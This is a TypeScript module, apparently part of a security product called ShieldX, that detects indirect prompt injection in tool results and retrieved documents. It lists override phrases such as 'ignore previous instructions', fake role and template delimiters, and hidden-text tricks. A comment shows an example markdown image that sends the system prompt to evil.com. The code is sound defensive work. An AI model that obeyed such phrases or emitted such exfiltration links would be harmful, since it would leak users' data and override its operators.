/**
 * Indirect Injection Detector — ShieldX Layer 3 (Indirect)
 *
 * Detects prompt injection patterns in content that arrives from
 * external sources: tool results, RAG documents, web scrapes,
 * emails, PDFs, etc. — any text the user did NOT type directly.
 *
 * Attack vectors covered:
 * 1. Instruction hijack patterns ("ignore previous instructions", "you are now")
 * 2. Hidden directives (excessive whitespace, zero-width chars, HTML comments)
 * 3. Role override attempts (system:/assistant: prefixes, fake personas)
 * 4. URL-based exfiltration (markdown images/links with data in URL params)
 * 5. Delimiter confusion (fake ```system, [INST], <<SYS>> markers)
 *
 * Research references:
 * - Greshake et al. 2023 "Not what you've signed up for" (indirect injection)
 * - arXiv:2302.12173 Indirect prompt injection in LLM-integrated apps
 * - OWASP LLM01:2025 Prompt Injection (direct + indirect)
 * - Schneier et al. 2026 Promptware Kill Chain (initial_access, command_and_control)
 * - MITRE ATLAS AML.T0051 (LLM Prompt Injection)
 *
 * Performance target: <5ms for full scan against typical document input.
 * All regex patterns are pre-compiled at module load time.
 */

import type { ScanResult, KillChainPhase, ThreatLevel } from '../types/detection'

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Build a frozen ScanResult matching the orchestrator's expected shape */
function makeResult(
  ruleId: string,
  phase: KillChainPhase,
  confidence: number,
  threatLevel: ThreatLevel,
  description: string,
  matchedText: string,
  latencyMs: number,
): ScanResult {
  return Object.freeze({
    scannerId: ruleId,
    scannerType: 'indirect' as const,
    detected: true,
    confidence,
    threatLevel,
    killChainPhase: phase,
    matchedPatterns: Object.freeze([matchedText.substring(0, 120)]),
    latencyMs,
    metadata: Object.freeze({ description, matchedText: matchedText.substring(0, 200) }),
  })
}

/** Map confidence to threat level using the same scale as RuleEngine */
function toThreatLevel(confidence: number): ThreatLevel {
  if (confidence >= 0.9) return 'critical'
  if (confidence >= 0.75) return 'high'
  if (confidence >= 0.5) return 'medium'
  if (confidence >= 0.25) return 'low'
  return 'none'
}

// ---------------------------------------------------------------------------
// 1. Instruction Hijack Patterns
// ---------------------------------------------------------------------------

/**
 * Pre-compiled patterns that detect attempts to override prior instructions
 * from within document/tool content. Case-insensitive, multiline-safe.
 */
const INSTRUCTION_HIJACK_PATTERNS: ReadonlyArray<{
  readonly pattern: RegExp
  readonly id: string
  readonly description: string
  readonly confidence: number
}> = Object.freeze([
  {
    pattern: /\b(?:ignore|disregard|forget|override|bypass)\b[^.]{0,30}\b(?:previous|prior|above|all|earlier|initial|original)\b[^.]{0,30}\b(?:instructions?|prompts?|rules?|guidelines?|directives?|constraints?)\b/i,
    id: 'indirect-hijack-ignore-previous',
    description: 'Instruction to ignore previous/prior instructions',
    confidence: 0.88,
  },
  {
    pattern: /\b(?:ignore|disregard|forget)\b[^.]{0,20}\b(?:everything|anything)\b[^.]{0,20}\b(?:above|before|prior|said)\b/i,
    id: 'indirect-hijack-ignore-everything',
    description: 'Broad instruction to ignore all prior context',
    confidence: 0.85,
  },
  {
    pattern: /\b(?:new|updated|revised|actual|real|correct)\b[^.]{0,15}\b(?:instructions?|system\s*prompt|directives?|task)\b\s*[:=]/i,
    id: 'indirect-hijack-new-instructions',
    description: 'Fake "new instructions" override in document content',
    confidence: 0.82,
  },
  {
    pattern: /\byou\s+(?:are|must|should|will)\s+now\b[^.]{0,40}\b(?:act\s+as|behave\s+as|pretend|become|role|persona)\b/i,
    id: 'indirect-hijack-role-assignment',
    description: 'Attempts to reassign the AI role from document content',
    confidence: 0.9,
  },
  {
    pattern: /\bdo\s+not\s+(?:mention|reveal|disclose|tell|show)\b[^.]{0,30}\b(?:this|these|the\s+following|that)\b/i,
    id: 'indirect-hijack-secrecy',
    description: 'Hidden secrecy directive embedded in document',
    confidence: 0.7,
  },
  {
    pattern: /\b(?:important|critical|urgent|mandatory)\s*(?::|!)\s*(?:ignore|disregard|override|the\s+following\s+instructions?)\b/i,
    id: 'indirect-hijack-urgency-prefix',
    description: 'Urgency prefix combined with instruction override',
    confidence: 0.8,
  },
]) as ReadonlyArray<{
  readonly pattern: RegExp
  readonly id: string
  readonly description: string
  readonly confidence: number
}>

// ---------------------------------------------------------------------------
// 2. Hidden Directive Detection
// ---------------------------------------------------------------------------

/**
 * Detects instructions that are visually hidden via whitespace padding,
 * zero-width characters, or HTML comment wrappers.
 */

/** Pattern: instruction-like text after 5+ newlines (pushed below visible area) */
const EXCESSIVE_WHITESPACE_DIRECTIVE = /\n{5,}((?:ignore|disregard|system|you are|new instructions|IMPORTANT)[^\n]{10,})/i

/** Pattern: HTML comment containing instruction-like content */
const HTML_COMMENT_DIRECTIVE = /<!--\s*(?:ignore|system|you are|instructions?|disregard|assistant)[^>]{5,}-->/i

/** Pattern: CSS/style blocks that could hide injected instructions */
const STYLE_HIDDEN_DIRECTIVE = /<style[^>]*>[\s\S]*?<\/style>/i

/**
 * Zero-width chars used to pad directives so they are invisible.
 * Checks for clusters of 4+ zero-width chars adjacent to ASCII text.
 */
const ZERO_WIDTH_CLUSTER = /[\u200B\u200C\u200D\u2060\uFEFF]{4,}/

// ---------------------------------------------------------------------------
// 3. Role Override Attempts
// ---------------------------------------------------------------------------

/**
 * Patterns that attempt to inject system/assistant role markers
 * inside document content where they should never appear.
 */
const ROLE_OVERRIDE_PATTERNS: ReadonlyArray<{
  readonly pattern: RegExp
  readonly id: string
  readonly description: string
  readonly confidence: number
}> = Object.freeze([
  {
    pattern: /^system\s*:/im,
    id: 'indirect-role-system-prefix',
    description: 'Fake "system:" role prefix in document content',
    confidence: 0.85,
  },
  {
    pattern: /^assistant\s*:/im,
    id: 'indirect-role-assistant-prefix',
    description: 'Fake "assistant:" role prefix in document content',
    confidence: 0.8,
  },
  {
    pattern: /^\[(?:SYSTEM|INST|SYS)\]/im,
    id: 'indirect-role-bracket-prefix',
    description: 'Bracket-style role prefix ([SYSTEM], [INST], [SYS])',
    confidence: 0.85,
  },
  {
    pattern: /\b(?:as\s+(?:an?\s+)?AI|as\s+(?:the\s+)?assistant|your\s+(?:new\s+)?(?:role|purpose|goal|objective)\s+is)\b/i,
    id: 'indirect-role-identity-override',
    description: 'Attempts to redefine the AI identity from document',
    confidence: 0.75,
  },
]) as ReadonlyArray<{
  readonly pattern: RegExp
  readonly id: string
  readonly description: string
  readonly confidence: number
}>

// ---------------------------------------------------------------------------
// 4. URL-Based Exfiltration
// ---------------------------------------------------------------------------

/**
 * Detects markdown images and links crafted to exfiltrate context
 * via URL query parameters or path segments.
 *
 * Attack pattern: ![img](https://evil.com/log?data={{system_prompt}})
 * The LLM may resolve template variables and leak data via the URL.
 */

/** Markdown image with query params or template interpolation */
const EXFIL_MARKDOWN_IMAGE = /!\[[^\]]*\]\(\s*https?:\/\/[^\s)]+[?&](?:[^\s)]*(?:data|token|key|secret|prompt|context|message|input|output|session|cookie|auth|user|password|api[_-]?key)=[^\s)]*)\s*\)/i

/** Markdown image with template syntax ({{...}}, ${...}, {%...%}) in URL */
const EXFIL_TEMPLATE_IN_URL = /!\[[^\]]*\]\(\s*https?:\/\/[^\s)]*(?:\{\{|\$\{|<%|{%)[^\s)]*\)/i

/** Markdown link disguised as reference, with exfil params */
const EXFIL_MARKDOWN_LINK = /\[[^\]]*\]\(\s*https?:\/\/[^\s)]+[?&](?:[^\s)]*(?:data|exfil|leak|steal|extract|dump|log|capture)=[^\s)]*)\s*\)/i

/** HTML img tag with exfiltration URL */
const EXFIL_HTML_IMG = /<img[^>]+src\s*=\s*["']https?:\/\/[^"']+[?&](?:[^"']*(?:data|token|key|secret|prompt|context)=[^"']*)/i

// ---------------------------------------------------------------------------
// 5. Delimiter Confusion
// ---------------------------------------------------------------------------

/**
 * Fake message delimiters injected in document content to confuse
 * the model into treating subsequent text as a new system/user turn.
 */
const DELIMITER_PATTERNS: ReadonlyArray<{
  readonly pattern: RegExp
  readonly id: string
  readonly description: string
  readonly confidence: number
}> = Object.freeze([
  {
    pattern: /```\s*(?:system|assistant|user|tool)\b/i,
    id: 'indirect-delim-fenced-role',
    description: 'Fenced code block with role name as language (```system)',
    confidence: 0.8,
  },
  {
    pattern: /<<\s*SYS\s*>>|<<\s*\/SYS\s*>>/i,
    id: 'indirect-delim-llama-sys',
    description: 'Llama-style <<SYS>> delimiter in content',
    confidence: 0.9,
  },
  {
    pattern: /\[INST\]|\[\/INST\]/i,
    id: 'indirect-delim-inst',
    description: 'Llama/Mistral [INST] delimiter in content',
    confidence: 0.88,
  },
  {
    pattern: /<\|(?:system|user|assistant|im_start|im_end|endoftext)\|>/i,
    id: 'indirect-delim-special-token',
    description: 'Special token delimiter (<|system|>, <|im_start|>, etc.)',
    confidence: 0.92,
  },
  {
    pattern: /---\s*(?:BEGIN|END)\s+(?:SYSTEM|INSTRUCTIONS?|PROMPT)\s*---/i,
    id: 'indirect-delim-separator',
    description: 'Fake --- BEGIN SYSTEM --- separator',
    confidence: 0.82,
  },
  {
    pattern: /={3,}\s*(?:SYSTEM|INSTRUCTIONS?)\s*={3,}/i,
    id: 'indirect-delim-equals',
    description: 'Equals-sign delimited fake section header',
    confidence: 0.78,
  },
]) as ReadonlyArray<{
  readonly pattern: RegExp
  readonly id: string
  readonly description: string
  readonly confidence: number
}>

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * IndirectInjectionDetector — Stateless scanner for indirect prompt injection.
 *
 * All patterns are pre-compiled at module load time for zero allocation
 * during scans. The class is instantiated once and reused across requests.
 *
 * Usage:
 * ```typescript
 * const detector = new IndirectInjectionDetector()
 * const results = detector.scan(toolResultText)
 * ```
 */
export class IndirectInjectionDetector {
  /**
   * Scan input text for indirect injection patterns.
   *
   * Checks all five categories in a single pass and returns
   * a ScanResult for every detected pattern.
   *
   * @param input - Text from an external source (tool result, RAG doc, etc.)
   * @returns Readonly array of ScanResult objects for detected threats
   */
  scan(input: string): readonly ScanResult[] {
    const start = performance.now()
    const results: ScanResult[] = []

    // Skip trivially short inputs — no injection possible
    if (input.length < 10) return Object.freeze([])

    // 1. Instruction hijack patterns
    for (const rule of INSTRUCTION_HIJACK_PATTERNS) {
      const match = rule.pattern.exec(input)
      if (match) {
        results.push(
          makeResult(
            rule.id,
            'initial_access',
            rule.confidence,
            toThreatLevel(rule.confidence),
            rule.description,
            match[0],
            performance.now() - start,
          ),
        )
      }
    }

    // 2. Hidden directives
    this.scanHiddenDirectives(input, start, results)

    // 3. Role override attempts
    for (const rule of ROLE_OVERRIDE_PATTERNS) {
      const match = rule.pattern.exec(input)
      if (match) {
        results.push(
          makeResult(
            rule.id,
            'initial_access',
            rule.confidence,
            toThreatLevel(rule.confidence),
            rule.description,
            match[0],
            performance.now() - start,
          ),
        )
      }
    }

    // 4. URL-based exfiltration
    this.scanExfiltration(input, start, results)

    // 5. Delimiter confusion
    for (const rule of DELIMITER_PATTERNS) {
      const match = rule.pattern.exec(input)
      if (match) {
        results.push(
          makeResult(
            rule.id,
            'initial_access',
            rule.confidence,
            toThreatLevel(rule.confidence),
            rule.description,
            match[0],
            performance.now() - start,
          ),
        )
      }
    }

    return Object.freeze(results)
  }

  // -------------------------------------------------------------------------
  // Private scan helpers
  // -------------------------------------------------------------------------

  /**
   * Check for hidden directives: excessive whitespace, HTML comments,
   * zero-width character clusters adjacent to instructional text.
   */
  private scanHiddenDirectives(
    input: string,
    start: number,
    results: ScanResult[],
  ): void {
    // Excessive whitespace followed by instructions
    const wsMatch = EXCESSIVE_WHITESPACE_DIRECTIVE.exec(input)
    if (wsMatch) {
      results.push(
        makeResult(
          'indirect-hidden-whitespace',
          'initial_access',
          0.8,
          'high',
          'Instruction hidden after excessive whitespace (pushed below visible area)',
          wsMatch[1] ?? wsMatch[0],
          performance.now() - start,
        ),
      )
    }

    // HTML comment containing instruction-like content
    const htmlMatch = HTML_COMMENT_DIRECTIVE.exec(input)
    if (htmlMatch) {
      results.push(
        makeResult(
          'indirect-hidden-html-comment',
          'initial_access',
          0.85,
          'high',
          'Instruction hidden inside HTML comment',
          htmlMatch[0],
          performance.now() - start,
        ),
      )
    }

    // CSS style block (potential hiding mechanism)
    const styleMatch = STYLE_HIDDEN_DIRECTIVE.exec(input)
    if (styleMatch) {
      // Only flag if the style block contains suspicious content
      const styleContent = styleMatch[0].toLowerCase()
      const hasSuspicious = /display\s*:\s*none|visibility\s*:\s*hidden|position\s*:\s*absolute|font-size\s*:\s*0|opacity\s*:\s*0/i.test(styleContent)
      if (hasSuspicious) {
        results.push(
          makeResult(
            'indirect-hidden-css-style',
            'initial_access',
            0.7,
            'medium',
            'CSS style block with hiding properties (display:none, visibility:hidden, etc.)',
            styleMatch[0].substring(0, 120),
            performance.now() - start,
          ),
        )
      }
    }

    // Zero-width character clusters (4+ in a row indicates intentional encoding)
    const zwMatch = ZERO_WIDTH_CLUSTER.exec(input)
    if (zwMatch) {
      // Check if cluster is adjacent to ASCII instructional text
      const clusterEnd = (zwMatch.index ?? 0) + zwMatch[0].length
      const after = input.substring(clusterEnd, clusterEnd + 60)
      const beforeStart = Math.max(0, (zwMatch.index ?? 0) - 60)
      const before = input.substring(beforeStart, zwMatch.index ?? 0)
      const contextText = before + after

      // Only flag if near instruction-like text
      const nearInstruction = /(?:ignore|system|instructions?|override|you are|assistant|disregard)/i.test(contextText)
      const confidence = nearInstruction ? 0.85 : 0.55
      const threat = nearInstruction ? 'high' : 'medium'

      results.push(
        makeResult(
          'indirect-hidden-zero-width',
          'initial_access',
          confidence,
          threat as ThreatLevel,
          `Zero-width character cluster (${zwMatch[0].length} chars)${nearInstruction ? ' adjacent to instruction text' : ''}`,
          `[${zwMatch[0].length} zero-width chars at offset ${zwMatch.index}]`,
          performance.now() - start,
        ),
      )
    }
  }

  /**
   * Check for URL-based data exfiltration attempts via markdown
   * images, links, and HTML img tags.
   */
  private scanExfiltration(
    input: string,
    start: number,
    results: ScanResult[],
  ): void {
    const exfilPatterns: ReadonlyArray<{
      readonly pattern: RegExp
      readonly id: string
      readonly description: string
      readonly confidence: number
    }> = [
      {
        pattern: EXFIL_MARKDOWN_IMAGE,
        id: 'indirect-exfil-md-image',
        description: 'Markdown image with data-exfiltration query parameters',
        confidence: 0.88,
      },
      {
        pattern: EXFIL_TEMPLATE_IN_URL,
        id: 'indirect-exfil-template-url',
        description: 'Markdown image with template interpolation in URL ({{...}}, ${...})',
        confidence: 0.92,
      },
      {
        pattern: EXFIL_MARKDOWN_LINK,
        id: 'indirect-exfil-md-link',
        description: 'Markdown link with exfiltration-style query parameters',
        confidence: 0.82,
      },
      {
        pattern: EXFIL_HTML_IMG,
        id: 'indirect-exfil-html-img',
        description: 'HTML img tag with data-exfiltration URL parameters',
        confidence: 0.88,
      },
    ]

    for (const rule of exfilPatterns) {
      const match = rule.pattern.exec(input)
      if (match) {
        results.push(
          makeResult(
            rule.id,
            'command_and_control',
            rule.confidence,
            toThreatLevel(rule.confidence),
            rule.description,
            match[0],
            performance.now() - start,
          ),
        )
      }
    }
  }
}
